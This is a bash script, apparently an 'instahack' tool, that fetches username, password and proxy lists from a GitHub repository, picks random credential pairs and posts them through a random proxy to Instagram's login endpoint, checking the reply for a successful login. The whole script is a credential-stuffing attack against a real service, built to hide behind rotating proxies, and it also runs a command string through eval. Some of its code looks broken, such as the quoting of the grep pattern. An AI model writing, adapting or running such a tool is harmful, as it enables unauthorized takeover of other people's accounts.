#!/bin/bash

# Log file
log="/var/log/temp.log"

# GitHub repository information
github_host="github.com"
github_user="SSLRI"
github_repo="instahack"

# Function to download file from GitHub
download_file() {
    local file_url="$1"
    local destination="$2"
    echo "Downloading: $file_url" | tee -a "$log"
    curl -s "$file_url" -o "$destination"
    echo "Download finished for: $destination" | tee -a "$log"
}

# Function to execute a command and log output
execute_command() {
  local command="$1"
  echo "Executing: $command" | tee -a "$log"
  local output=$(eval "$command" 2>&1)
  echo "$output" | tee -a "$log"
}


# Function to get a random number
get_random_number() {
   local min="$1"
   local max="$2"
   echo $(($RANDOM % ($max - $min + 1) + $min))
}


# Main execution loop
for i in $(seq 1 5); do
    echo "Step $i"
    if [[ $i -eq 1 ]]; then
        # Step 1: Get user list from github
        echo "Fetching user list..."
        user_file="userlist.txt"
        user_url="https://raw.githubusercontent.com/$github_user/$github_repo/master/users.txt"

        download_file "$user_url" "$user_file"
    
        if [[ -f "$user_file" ]]; then
          echo "User file downloaded successfully."
           user_count=$(wc -l < "$user_file")
           echo "Total users: $user_count"
        else
          echo "Error downloading user file."
          exit 1
        fi

    elif [[ $i -eq 2 ]]; then
        # Step 2: Get password list from github
        echo "Fetching password list..."
        pass_file="passlist.txt"
        pass_url="https://raw.githubusercontent.com/$github_user/$github_repo/master/passwords.txt"
    
        download_file "$pass_url" "$pass_file"
            
        if [[ -f "$pass_file" ]]; then
          echo "Password file downloaded successfully."
           pass_count=$(wc -l < "$pass_file")
           echo "Total passwords: $pass_count"
        else
          echo "Error downloading password file."
          exit 1
        fi
    elif [[ $i -eq 3 ]]; then
        # Step 3: Get Proxy List from GitHub
      echo "Fetching proxy list..."
      proxy_file="proxy.txt"
      proxy_url="https://raw.githubusercontent.com/$github_user/$github_repo/master/proxy.txt"
    
      download_file "$proxy_url" "$proxy_file"

      if [[ -f "$proxy_file" ]]; then
        echo "Proxy file downloaded successfully."
        proxy_count=$(wc -l < "$proxy_file")
        echo "Total proxies: $proxy_count"
      else
        echo "Error downloading proxy file."
        exit 1
      fi
    elif [[ $i -eq 4 ]]; then
        # Step 4: Generate random user and password combinations for testing
        echo "Generating user and password combinations..."
          
           if [[ -f "$user_file" && -f "$pass_file" ]]; then
            
              random_user_index=$(get_random_number 1 "$user_count")
              random_pass_index=$(get_random_number 1 "$pass_count")

              random_user=$(sed -n "${random_user_index}p" "$user_file")
              random_pass=$(sed -n "${random_pass_index}p" "$pass_file")
              echo "Selected user: $random_user"
              echo "Selected pass: $random_pass"
           else
               echo "Error: user or password file not found."
           fi

    elif [[ $i -eq 5 ]]; then
      # Step 5: Execute login check with the random user/pass
       if [[ -n "$random_user" && -n "$random_pass" ]]; then
           echo "Trying to check login with user: $random_user"
           if [[ -f "$proxy_file" ]]; then
              random_proxy_index=$(get_random_number 1 "$proxy_count")
              random_proxy=$(sed -n "${random_proxy_index}p" "$proxy_file")
               echo "Selected proxy: $random_proxy"
               execute_command "curl -x $random_proxy -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
             else
               echo "Error: Proxy file not found."
           fi
       else
           echo "Error: User or password not found for testing."
        fi
    fi
done

echo "Script execution completed."
